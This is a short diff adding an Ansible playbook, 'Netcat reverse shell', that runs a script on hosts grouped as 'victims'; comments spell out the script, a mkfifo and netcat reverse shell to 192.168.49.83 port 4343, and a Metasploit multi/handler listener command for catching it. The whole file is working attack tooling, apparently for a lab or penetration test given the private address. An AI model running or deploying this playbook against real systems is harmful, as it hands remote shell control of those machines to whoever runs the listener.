@@ -1,0 +1,11 @@
+# rev_shell.sh needs to live locally
+# #!/bin/bash
+# mkfifo /tmp/zlrfnh; nc 192.168.49.83 4343 0</tmp/zlrfnh | /bin/sh >/tmp/zlrfnh 2>&1; rm /tmp/zlrfnh
+# msfconsole -x "use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_netcat; set LHOST 192.168.49.83; set LPORT 4343; run"
+---
+- name: Netcat reverse shell
+  hosts: victims
+  gather_facts: false
+  tasks:
+    - name: Run netcat script
+      script: /opt/playbooks/rev_shell.sh
